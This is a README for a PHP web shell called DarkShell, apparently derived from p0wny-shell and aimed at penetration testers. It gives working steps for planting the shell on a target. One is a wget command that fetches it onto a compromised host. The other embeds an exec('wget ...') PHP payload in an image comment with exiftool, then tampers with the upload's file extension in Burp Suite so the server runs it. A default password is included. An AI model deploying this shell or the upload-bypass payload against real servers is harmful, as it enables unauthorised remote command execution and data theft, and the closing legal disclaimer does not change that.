# DarkPlace Shell

Welcome to **DarkPlace**, a simple web-based shell interface built using PHP. This application allows authenticated users to execute shell commands directly from their web browser.
Modified from the original to be used more safely during Penetration Testing and Red Team activities.

## Features

- **Authentication**: Secure access with a hardcoded password.
- **Shell Commands**: Execute various shell commands like `cd`, `download`, and more.
- **File Upload/Download**: Upload files to the server and download files from it.
- **Command History**: Navigate through previously entered commands using arrow keys.
- **Dynamic Prompt**: Displays the current working directory and user information.

## Getting Started

### Prerequisites

- PHP (>= 7.0)
- A web server (e.g., Apache, Nginx) with PHP support

### Installation

1. You can use wget for this shell directly from the target for an upgrade (via a simple shell):
   ```bash
   wget -O darkshell.php https://raw.githubusercontent.com/DarkSolo/DarkShell/refs/heads/main/DarkShell.php
   ```

2. Configure your web server to point to the cloned directory.

3. Open the web browser and navigate to your server's address.

4. Enter password: `YouHaveBeenHacked!` if you have not changed it. Are you sure you don't want to change huh?!

### Installation 2
Upload an image with "PHP command" in comment section and tamper file extension during upload

1) Edit Image:
   ```bash
   exiftool -Comment="<?php exec('wget -O ds.php https://raw.githubusercontent.com/DarkSolo/DarkShell/refs/heads/main/DarkShell.php'); ?>" filename.jpg
   ```

2) Upload Image:<br>
- Go to user profile -> photo
- Upload filename.jpg
- Intercept data with Burp Suite and tamper <b>filename.jpg</b> to <b>filename.php</b>

3) Check upload and got shell:
- Visit filename.php to exec command and download full shell
- Visit ds.php
- If exist you got a full shell!

4) Enter password: `YouHaveBeenHacked!` if you have not changed it. Are you sure you don't want to change huh?!

### Usage

Once logged in, you can start entering shell commands in the provided input field. Use commands such as:

- `download <filename>` - Download a file from the server
- `upload <filepath>` - Upload a file to the server
- any other shell command (almost all)

### Security Considerations

This application is intended for educational purposes only. Do not use it in a production environment without implementing proper security measures.
Performing hacking attempts on computers that you do not own (without permission) is illegal! Do not attempt to gain access to device that you do not own.

### Original Script

This project is based on the initial script from [p0wny-shell](https://github.com/flozz/p0wny-shell/tree/master).


## Acknowledgments

- [PHP](https://www.php.net/)
- [HTML/CSS](https://www.w3.org/)
- Inspiration from various web shell implementations.
